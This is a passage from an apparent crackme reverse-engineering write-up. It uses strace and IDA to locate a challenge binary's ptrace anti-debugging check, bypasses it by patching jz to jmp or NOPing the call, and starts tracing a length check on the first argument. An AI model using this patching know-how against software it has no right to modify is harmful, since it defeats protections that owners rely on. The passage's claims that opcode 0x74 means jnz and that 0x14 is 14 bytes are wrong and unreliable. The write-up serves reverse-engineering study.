<code>ptrace</code> on the binary with two arguments with this new swtich and look at the results.</p><figure class=code><figcaption><span>strace -i</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>    7f87e90646e7<span style=color:#719e07>]</span> execve<span style=color:#719e07>(</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f5504196561297&#34;</span>, <span style=color:#719e07>[</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f55041965612&#34;</span>..., <span style=color:#2aa198>&#34;arg1&#34;</span>, <span style=color:#2aa198>&#34;arg2&#34;</span><span style=color:#719e07>]</span>, <span style=color:#719e07>[</span>/* <span style=color:#2aa198>31</span> vars */<span style=color:#719e07>])</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          4a9297<span style=color:#719e07>]</span> uname<span style=color:#719e07>({</span><span style=color:#268bd2>sys</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Linux&#34;</span>, <span style=color:#268bd2>node</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;kali&#34;</span>, ...<span style=color:#719e07>})</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          4aa78a<span style=color:#719e07>]</span> brk<span style=color:#719e07>(</span>0<span style=color:#719e07>)</span>               <span style=color:#719e07>=</span> 0x1212000
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          4aa78a<span style=color:#719e07>]</span> brk<span style=color:#719e07>(</span>0x12131c0<span style=color:#719e07>)</span>       <span style=color:#719e07>=</span> 0x12131c0
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          45e3f5<span style=color:#719e07>]</span> arch_prctl<span style=color:#719e07>(</span>ARCH_SET_FS, 0x1212880<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          4aa78a<span style=color:#719e07>]</span> brk<span style=color:#719e07>(</span>0x12341c0<span style=color:#719e07>)</span>       <span style=color:#719e07>=</span> 0x12341c0
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          4aa78a<span style=color:#719e07>]</span> brk<span style=color:#719e07>(</span>0x1235000<span style=color:#719e07>)</span>       <span style=color:#719e07>=</span> 0x1235000
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          47431b<span style=color:#719e07>]</span> ptrace<span style=color:#719e07>(</span>PTRACE_TRACEME, 0, 0x1, 0<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> -1 EPERM <span style=color:#719e07>(</span>Operation not permitted<span style=color:#719e07>)</span>
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          473e44<span style=color:#719e07>]</span> fstat<span style=color:#719e07>(</span>1, <span style=color:#719e07>{</span><span style=color:#268bd2>st_mode</span><span style=color:#719e07>=</span>S_IFCHR|0620, <span style=color:#268bd2>st_rdev</span><span style=color:#719e07>=</span>makedev<span style=color:#719e07>(</span>136, 0<span style=color:#719e07>)</span>, ...<span style=color:#719e07>})</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          47509a<span style=color:#719e07>]</span> mmap<span style=color:#719e07>(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> 0x7f617785f000
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          473f50<span style=color:#719e07>]</span> write<span style=color:#719e07>(</span>1, <span style=color:#2aa198>&#34;Program received signal SIGSEGV,&#34;</span>..., 52Program received signal SIGSEGV, Segmentation fault<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>52</span>
</span></span><span style=display:flex><span><span style=color:#719e07>[</span>          473dd8<span style=color:#719e07>]</span> exit_group<span style=color:#719e07>(</span>9001<span style=color:#719e07>)</span>     <span style=color:#719e07>=</span> ?</span></span></code></pre></td></tr></table></div></div></div></figure><p>Look at IP at the time of <code>ptrace</code> in line 9: <code>47431b</code>. Now look at the IDA screenshot above.</p><p>So this function calls <code>ptrace</code>. To find out where this function is being called, highlight it and press <code>x</code> in IDA. There is only one call.</p><figure class=code><figcaption><span>bypassing ptrace</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F1F8</span> <span style=color:#268bd2>B9</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F1FD</span> <span style=color:#268bd2>BA</span> <span style=color:#2aa198>01</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F202</span> <span style=color:#268bd2>BE</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esi</span>, <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F207</span> <span style=color:#268bd2>BF</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edi</span>, <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F20C</span> <span style=color:#268bd2>B8</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span> <span style=color:#2aa198>00</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F211</span> <span style=color:#268bd2>E8</span> <span style=color:#2aa198>9</span><span style=color:#268bd2>A</span> <span style=color:#2aa198>50</span> <span style=color:#2aa198>05</span>    <span style=color:#268bd2>call</span>    <span style=color:#268bd2>calls_ptrace</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F216</span> <span style=color:#2aa198>48</span> <span style=color:#268bd2>C1</span> <span style=color:#268bd2>E8</span> <span style=color:#2aa198>3</span><span style=color:#268bd2>F</span>    <span style=color:#268bd2>shr</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>3Fh</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F21A</span> <span style=color:#2aa198>84</span> <span style=color:#268bd2>C0</span>          <span style=color:#268bd2>test</span>    <span style=color:#b58900>al</span>, <span style=color:#b58900>al</span>     <span style=color:#586e75>; if ptrace return value is zero jump to bypass_ptrace</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F21C</span> <span style=color:#2aa198>74</span> <span style=color:#2aa198>14</span>          <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>bypass_ptrace</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F21E</span> <span style=color:#268bd2>BF</span> <span style=color:#2aa198>50</span> <span style=color:#2aa198>3</span><span style=color:#268bd2>B</span> <span style=color:#2aa198>4</span><span style=color:#268bd2>F</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edi</span>, <span style=color:#268bd2>offset</span> <span style=color:#268bd2>aProgramReceive</span> <span style=color:#586e75>; &#34;Program received signal SIGSEGV, Segmentation fault&#34;</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F223</span> <span style=color:#268bd2>E8</span> <span style=color:#268bd2>B8</span> <span style=color:#268bd2>F9</span> <span style=color:#2aa198>03</span>    <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sys_write_call</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F228</span> <span style=color:#268bd2>BF</span> <span style=color:#2aa198>29</span> <span style=color:#2aa198>23</span> <span style=color:#2aa198>00</span>    <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edi</span>, <span style=color:#2aa198>2329h</span>
</span></span><span style=display:flex><span>.text:000000000041<span style=color:#268bd2>F22D</span> <span style=color:#268bd2>E8</span> <span style=color:#2aa198>5</span><span style=color:#268bd2>E</span> <span style=color:#268bd2>F5</span> <span style=color:#2aa198>03</span>    <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_45E790</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Return value from <code>ptrace</code> is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the <code>Option</code> menu and then <code>General</code>. Change the <code>number of opcode bytes</code>.</p><p>To patch the binary to bypass ptrace we need to change the <code>jz</code> instruction in line 9 to <code>jmp</code>. In this short jump <code>0x74</code> stands for <code>jnz</code> and <code>0x14</code> means thee number of bytes to jump (in this case 14 bytes ahead). To patch it to <code>jmp</code>, change <code>0x74</code> to <code>0xEB</code>. Open the binary in a hex editor (e.g. Bless). Now we need to find this offset. I do what I call <code>lazy patching</code>. Search for opcodes for the last few instructions before and <code>jnz</code> in hex editor. In this case we are looking for <code>48 C1 E8 3F 84 C0 74 14</code>. There is probably only one place in the binary with this sequence of bytes. Find it and change <code>0x74</code> to <code>0xEB</code>. Now we have bypassed <code>ptrace</code>. Another alternative is to replace the <code>call calls_ptrace</code> in line 6 with NOPs. NOP is short for No Operation and has the opcode <code>0x90</code>. It actually stands for <code>xchg eax, eax</code>. Both of them work.</p><p>So I bypassed <code>ptrace</code>. There were a lot of calculations. Random strings were loaded and manipulated. After stepping around the code in IDA I gave up. At this point I had two leads:</p><ol><li>The binary prints <code>no</code>. Put breakpoints on all <code>sys_write</code> calls and trace the print back</li><li>The application needs to manipulate the arguments somehow. Search for <a href=http://www.csc.depauw.edu/~bhoward/asmtut/asmtut7.html target=_blank rel="noreferrer noopener">string instructions</a>, breakpoint them and see if we hit one</li></ol><p>I chose option 2, searched for string instructions and assigned breakpoints. After running the program I hit a <code>repne scasb</code>.</p><p>What does <code>repne scasb</code> do?<br><code>repne scasb</code> will scan the string in <code>di/edi/rdi</code> for the byte (<code>scasb</code> is the byte version of <code>scas</code> instruction) in <code>ax/eax/rax</code> and decrease <code>cx/ecx/rcx</code> by one after each execution. It stops if <code>cx/ecx/rcx</code> reaches zero or if a match is found.</p><figure class=code><figcaption><span>strlen</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>CF</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C0</span>]
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>D6</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>DA</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rax</span>]
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>DD</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C8</span>], <span style=color:#2aa198>0FFFFFFFFFFFFFFFFh</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>E8</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rdx</span>, <span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>EB</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0</span>          <span style=color:#586e75>; null terminator</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>F0</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rcx</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C8</span>]   <span style=color:#586e75>; 0FFFFFFFFFFFFFFFFh</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>F7</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rdi</span>, <span style=color:#b58900>rdx</span>        <span style=color:#586e75>; rdi = arg1</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>FA</span> <span style=color:#268bd2>repne</span> <span style=color:#268bd2>scasb</span>             <span style=color:#586e75>; searching for null terminator</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>FA</span>                         <span style=color:#586e75>; in other words strlen</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>FC</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, <span style=color:#b58900>rcx</span>
</span></span><span style=display:flex><span>.text:00000000004370<span style=color:#268bd2>FF</span> <span style=color:#268bd2>not</span>     <span style=color:#b58900>rax</span>
</span></span><span style=display:flex><span>.text:0000000000437102 <span style=color:#268bd2>sub</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>.text:0000000000437106 <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>0Ah</span>        <span style=color:#586e75>; if ( strlen(arg1) == 10 ) jump</span>
</span></span><span style=display:flex><span>.text:000000000043710<span style=color:#268bd2>A</span> <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>strlen_arg1_equals_10</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Null terminator or <code>0x00</code> is saved in eax in line 6. Line 7 has <code>rcx</code>. We don't want <code>rcx</code> to reach zero before the end of the string. First argument is saved in <code>rdi</code> in line 8 and finally line 9 calls <code>repne scasb</code>. This is basically <code>strlen(arg1)</code>. In line 14, it is checked if the length of first argument is 10. If so we will jump.</p><figure class=code><figcaption><span>strlen_arg1_equals_10</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:0000000000437120 strlen_arg1_equals_10:  <span style=color:#586e75>; strlen(arg1) == 10 Decimal</span>
</span></span><span style=display:flex><span>.text:0000000000437120 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C0</span>]
</span></span><span style=display:flex><span>.text:0000000000437127 <span style=color:#268bd2>add</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>.text:000000000043712<span style=color:#268bd2>B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rax</span>]           <span style=color:#586e75>; rax = arg1</span>
</span></span><span style=display:flex><span>.text:000000000043712<span style=color:#268bd2>E</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rdi</span>, <span style=color:#b58900>rax</span>             <span style=color:#586e75>; rdi = arg1</span>
</span></span><span style=display:flex><span>.text:0000000000437131 <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_468BB0</span>
</span></span><span style=display:flex><span>.text:0000000000437136 <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>arg1_2</span>], <span style=color:#b58900>rax</span>    <span style=color:#586e75>; rax = arg1</span>
</span></span><span style=display:flex><span>.text:000000000043713<span style=color:#268bd2>D</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>counter_?</span>], <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>.text:0000000000437147 <span style=color:#268bd2>jmp</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_437177</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>We can see that arg1 is saved to <code>rdi</code> in line 5 and <code>sub_468BB0</code> is called. We can get inside <code>sub_468BB0</code> but it is basically <code>malloc</code>. It allocates a string and initializes it with first argument. Return value is in <code>rax</code> which is a pointer to the newly created string. It is saved to <code>[rbp+arg1_2]</code> (I have renamed the variables). Finally there is an unconditional jump.</p><figure class=code><figcaption><span>loc_437177</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:0000000000437177 loc_437177:
</span></span><span style=display:flex><span>.text:0000000000437177 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>counter_?</span>]
</span></span><span style=display:flex><span>.text:000000000043717<span style=color:#268bd2>D</span> <span style=color:#268bd2>movsxd</span>  <span style=color:#b58900>rsi</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:0000000000437180 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>rax</span>, [<span style=color:#b58900>rbp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_3C0</span>]
</span></span><span style=display:flex><span>.text:0000000000437187 <span style=color:#268bd2>add</span>     <span style=color:#b58900>rax</span>, <span style=color:#2aa198>8</span>
